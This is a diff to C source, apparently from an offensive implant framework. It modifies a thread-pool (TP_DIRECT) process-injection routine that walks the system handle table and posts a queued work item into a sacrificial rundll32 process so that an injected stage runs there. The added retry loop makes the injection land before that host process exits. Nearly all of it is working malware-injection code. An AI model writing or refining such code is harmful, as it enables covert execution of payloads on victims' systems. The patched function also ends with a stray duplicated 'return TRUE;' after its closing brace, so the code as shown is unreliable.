@@ -717,18 +717,23 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 		spawn_log("tpdirect: patsy resumed, pool warmup wait done", 0x7fffffff);
 	}
 
-	/* 3. handle-table walk + post */
+	/* 3. handle-table walk + post, as a retry loop: the bare rundll32
+	 * spawnto exits ~1s after resume, but its thread pool initializes
+	 * within the first few hundred ms - post every 100ms so the first
+	 * pool IOCP that exists catches the TP_DIRECT. The moment a post
+	 * lands, the stage runs and keeps the process alive. */
+	for (int round = 0; round < 40; round++) {
 	ULONG len = 0x100000;
 	unsigned char * hbuf = (unsigned char *)malloc(len);
 	if (hbuf == NULL)
 		return FALSE;
 	NTSTATUS st;
 	int tries = 0;
-	spawn_log("tpdirect: walk begin len=", (long)len);
+	if (round == 0)
+		spawn_log("tpdirect: walk begin len=", (long)len);
 	while (TRUE) {
 		ULONG need = 0;
 		st = pQuerySys(64 /*SystemExtendedHandleInformation*/, hbuf, len, &need);
-		spawn_log("tpdirect: walk try st=", (long)st);
 		if (st == 0xC0000004 /*STATUS_INFO_LENGTH_MISMATCH*/) {
 			if (++tries > 8 || need == 0 || need > 0x8000000) {
 				spawn_log("tpdirect: walk bound exit need=", (long)need);
@@ -772,17 +777,23 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 		}
 	}
 	free(hbuf);
-	spawn_log("tpdirect: posted=", (long)posted);
-	spawn_log("tpdirect: accepted iocp=", (long)accepted);
+	if (round == 0) {
+		spawn_log("tpdirect: posted=", (long)posted);
+		spawn_log("tpdirect: accepted iocp=", (long)accepted);
+	}
+	if (accepted > 0)
+		break;
+	Sleep(100);
+	}
 	if (accepted == 0) {
 		spawn_log("tpdirect: no pool iocp accepted", 0x7fffffff);
 		return FALSE;
 	}
 
-	/* the pool dequeues asynchronously; our caller treats TRUE as injected */
 	Sleep(500);
 	spawn_log("tpdirect: armed and queued", 0x7fffffff);
 	return TRUE;
+}	return TRUE;
 }
 
 BOOL inject_via_tpstart_routine_stub(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
